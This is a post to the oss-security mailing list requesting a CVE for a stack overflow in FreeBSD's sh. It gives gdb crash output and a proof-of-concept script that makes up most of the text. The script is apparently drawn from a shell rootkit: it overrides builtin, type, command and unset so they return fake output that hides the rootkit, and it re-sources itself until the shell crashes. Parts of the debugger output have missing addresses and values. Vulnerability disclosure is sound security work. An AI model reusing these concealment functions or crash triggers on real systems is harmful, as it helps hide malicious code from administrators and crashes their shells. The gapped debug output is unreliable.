  oss-security - CVE request: freebsd/sh stack overflow vulnerability            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Tue, 31 Mar From: wzt wzt <wzt.wzt@...il.com> To: oss-security@...ts.openwall.com Subject: CVE request: freebsd/sh stack overflow vulnerability  hiďź     I found sh have a stack overflow bug on  it may be triggered on all freebsd systems, but i have not tested yet. the poc below is tested on amd64 arch:  $ ls brootkit.sh $ . brootkit.sh $ command $ ls brootkit.sh     sh.core  (gdb) x/16x Cannot access memory at address (gdb) x/16x                                          (gdb) disass malloc malloc+32 Dump of assembler code from to <malloc+0>:  push   %rbp <malloc+1>:  mov    %rsp,%rbp <malloc+4>:  push   %r15 <malloc+6>:  push   %r14 <malloc+8>:  push   %r13 <malloc+10>: push   %r12 <malloc+12>: push   %rbx <malloc+13>: sub    <malloc+20>: mov    <malloc+27>: mov           #   set $i=0 set $addr=$rbp while ($i <= printf "frame[%d] 0x%lx ==> 0x%lx retaddr: 0x%lx\t diass: ", $i, $addr, *(long *)$addr, *(long *)($addr+8) x/i  *(long *)($addr+8) set $i=$i+1 set $addr=*(long *)$addr end  frame[98] ==> retaddr:    diass:    incq          # <environ+64> frame[99] ==> retaddr:    diass:     mov    ==> retaddr:   diass:     cmpl          # <environ+84>  poc:  #!/bin/sh  BR_ROOTKIT_PATH="."  builtin() {         local fake_a          unset command         case $1 in                 "set"|"unset"|"command"|"type")                         fake_a="$(command builtin $1 $2)"                         br_hide_engine "$fake_a"                         reset_command                         return ;;                 "builtin")                         echo "sh: builtin: builtin: syntax error, sh is not support."                         reset_command                         return ;;                 *)                         command builtin $1 $2                         reset_command                         ;;         esac }  type() {         case $1 in                 "builtin"|"set"|"unset"|"type")                         echo "$1 is a shell builtin"                         return ;;                 "dir")                         echo "dir is /usr/bin/dir"                         return ;;                 "ls")                         echo "ls is aliased to ls --color=tty"                         return ;;                 "ps")                         echo "ps is /bin/ps"                         return ;;                 "netstat")                         echo "netstat is hashed (/usr/bin/netstat)"                         return ;;                 "/bin/ls"|"/usr/bin/dir"|"/bin/ps"|"/usr/bin/netstat")                         echo "$1 is $1"                         return ;;                 *)                         unset command                         command type $1 $2                         reset_command                         return ;;         esac }  fake_unset() {         case $1 in                 "builtin"|"command"|"set"|"unset"|"type")                         echo "sh: syntax error, sh is not support."                         return ;;                 *)                         unset $1 $2                         return ;;         esac }  fake_command() {         case $1 in                 "builtin"|"command"|"set"|"unset"|"type")                         echo "sh: syntax error, sh is not support."                         return ;;                 *)                         unset command                         command $1 $2                         reset_command                         return ;;         esac }  command() {         case $1 in                 "builtin")                         builtin $2 $3                         return ;;                 "unset")                         fake_unset $2 $3                         . $BR_ROOTKIT_PATH/brootkit.sh                         return ;;                 "type")                         type $2 $3                         return ;;                 "command")                         fake_command $2 $3                         return ;;                 *)                         unset command                         command $2 $3                         . $BR_ROOTKIT_PATH/brootkit.sh                         return ;;         esac }  reset_command() {         command()         {                 case $1 in                         "builtin")                                 builtin $2 $3                                 return ;;                         "set")                                 set $2 $3                                 return ;;                         "unset")                                 fake_unset $2 $3                                 . $BR_ROOTKIT_PATH/brootkit.sh                                 return ;;                         "type")                                 type $2 $3                                 return ;;                         "command")                                 fake_command $2 $3                                 return ;;                         *)                                 unset command                                 command $2 $3                                 . $BR_ROOTKIT_PATH/brootkit.sh                                 return ;;                 esac         } }   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      